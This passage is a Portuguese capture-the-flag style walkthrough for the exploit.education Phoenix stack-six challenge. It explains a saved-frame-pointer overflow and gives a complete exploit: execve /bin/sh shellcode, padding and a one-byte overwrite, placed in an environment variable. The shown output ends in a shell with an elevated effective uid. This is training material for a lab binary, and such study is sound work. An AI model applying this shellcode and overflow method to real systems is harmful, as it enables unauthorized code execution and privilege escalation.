<p>E você talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code>gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! Então não precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se você quer continuar sozinhx, agora é sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow é: c0
Eu recomendo vc tentar encontrar ele por conta propria :D
.
.
.
.
.
.
.
</code></pre>
<h2><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h2>
<p>Então o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela </p>
<p>Isso quer dizer que conseguimos execução de codigo! lembrando que isso é muito fragil: uma alteração nas envs e o exploit quebra!</p>
<p>Nos podemos usar tecnicas como encontrar um pointer que esta numa localização fica usando <code>ROPgadgets</code>, ou um NOP sled!</p>
<p>Porem, nesse desafio vamos focar em só fazer ele funcionar! Casp vc queira, pode aplicar as tecnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao enves de <code>/opt/phoenix/amd64/stack-six</code>, o exploit não funciona :(</p>
<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code> (uma variavel <strong>gigantesca</strong> que lista as cores do terminal! Caso você um terminal mais moderno para entrar via ssh, pode haver uma diferença!</p>
<p>Mas você esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! Até achar um que funciona é tentativa e erro! Eu recomendo você procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, você pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu é o limite! Ou talvez nem o ceu... ja que esse esse é um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial é sobre quebrar o limite de buffers! Não tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de você socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem graça a parte, o exploit ficou assim:</p>
<blockquote>
<p>user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) 
egid=406(phoenix-amd64-stack-six) groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! Então parabens por ter chegado ate aqui! :D</p>
<h1><a class="header" href="#solução" id="solução">Solução</a></h1>
<blockquote>
<p>user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) 
egid=406(phoenix-amd64-stack-six) groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                            <a rel="prev" href="../phoenix/StackFive.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                    <a rel="prev" href="../phoenix/StackFive.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                

                
            </nav>

        </div>

        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        

    </body>
</html>
